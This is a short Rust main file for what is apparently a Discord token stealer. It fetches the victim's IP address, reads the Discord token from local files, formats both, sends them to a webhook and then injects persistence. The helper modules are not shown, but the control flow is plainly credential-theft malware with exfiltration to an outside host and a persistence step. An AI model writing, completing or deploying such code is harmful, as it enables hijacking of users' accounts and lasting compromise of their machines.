mod filesystem;
mod network;

fn main() {
    let ip_address = network::get_ip_address();
    let token = filesystem::get_discord_token();
    let fmt = network::format_token(&token, &ip_address);
    network::send_webhook_message(&fmt);
    filesystem::inject_persistence();
}
